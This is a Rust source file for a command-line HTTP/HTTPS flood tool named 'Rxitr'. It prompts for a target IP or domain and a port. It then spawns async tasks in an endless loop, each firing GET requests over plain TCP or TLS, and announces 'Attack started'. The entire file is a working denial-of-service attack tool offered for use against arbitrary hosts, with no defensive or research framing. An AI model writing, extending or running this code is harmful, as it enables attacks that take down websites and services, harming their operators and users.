use colored::*;
use std::io::{self, Write};
 
use tokio::net::TcpStream;
use tokio::io::{AsyncWriteExt};
use tokio::process::Command;
 
use easy_tokio_rustls::{TlsClient, EasyTlsError};
 
static mut REQUESTS: i32 = 0;
 
async unsafe fn make_https_request(ip: &str, port: &str) -> Result<(), EasyTlsError> {
    let stream = TlsClient::new(format!("{}:{}", ip, port)).await.unwrap();
 
    let mut conn = stream.connect().await.unwrap();
    
    let request = format!(
        "GET / HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: SimpleTool/1.0\r\nConnection: keep-alive\r\n\r\n",
        ip, port
    );
 
    conn.write(request.as_bytes()).await.unwrap();
 
    REQUESTS += 1;
    println!("Total requests made: {REQUESTS}");
 
    Ok(())
}
 
async unsafe fn make_request(ip: &str, port: &str) -> Result<(), io::Error> {
    let mut stream = TcpStream::connect(format!("{}:{}", ip, port)).await?;
 
    let request = format!(
        "GET / HTTP/1.1\r\nHost: {}:{}\r\nUser-Agent: SimpleTool/1.0\r\nConnection: keep-alive\r\n\r\n",
        ip, port
    );
 
    stream.write_all(request.as_bytes()).await?;
 
    REQUESTS += 1;
    println!("Total requests made: {REQUESTS}");
 
    Ok(())
}
 
 
#[tokio::main]
async fn main() -> Result<(), io::Error> {
    let mut command;
    if cfg!(windows) {
        command = Command::new("cmd")
            .args(&["/C", "cls"])
            .spawn()?;
        command.wait().await?;
    } else {
        command = Command::new("clear")
            .spawn()?;
 
        command.wait().await?;
    }
 
    let banner = r#"
             ____        _ _        
            |  _ \ __  _(_) |_ _ __ 
            | |_) |\ \/ / | __| '__|
            |  _ <  >  <| | |_| |   
            |_| \_\/_/\_\_|\__|_|   
 
        
        (1) HTTP Flood
        (2) HTTPS Flood
  "#;
    println!("{}", banner.red());
 
    let mut input = String::new();
    print!(" Enter an option -> ");
    io::stdout().flush()?;
 
    io::stdin().read_line(&mut input)?;
 
    let input: i32 = input.trim().parse().unwrap();
    if input == 1 {
        let mut ip = String::new();
        let mut port = String::new();
 
        print!(" IP Address or Domain (without http) -> ");
        io::stdout().flush().expect(" Error flushing stdout.");
        io::stdin().read_line(&mut ip).expect(" Error reading stdin.");
 
        print!(" Port (Usually are 80) -> ");
        io::stdout().flush().expect("Error flushing stdout.");
        io::stdin().read_line(&mut port).expect(" Error reading stdin.");
 
        let ip = ip.trim();
        let port = port.trim();
 
        println!(" Attack started to {}:{}", ip, port);
 
        loop {
            let ip_clone = ip.to_owned();
            let port_clone = port.to_owned();
 
            tokio::spawn(unsafe { async move {
                make_request(&ip_clone, &port_clone).await.unwrap();
            }});
        }
    } else if input == 2 {
        let mut ip = String::new();
        let mut port = String::new();
 
        print!(" IP Address or Domain (without https) -> ");
        io::stdout().flush().expect(" Error flushing stdout.");
        io::stdin().read_line(&mut ip).expect(" Error reading stdin.");
 
        print!(" Port (Usually are 443) -> ");
        io::stdout().flush().expect("Error flushing stdout.");
        io::stdin().read_line(&mut port).expect(" Error reading stdin.");
 
        let ip = ip.trim();
        let port = port.trim();
 
        print!(" Attack started to {}:{}", ip, port);
 
        loop {
            let ip_clone = ip.to_owned();
            let port_clone = port.to_owned();
 
            tokio::spawn(unsafe { async move {
                make_https_request(&ip_clone, &port_clone).await.unwrap();
            }});
        }
    }
 
    print!("{}", " - ERROR: Invalid Option\n".red());
 
    Ok(())
}
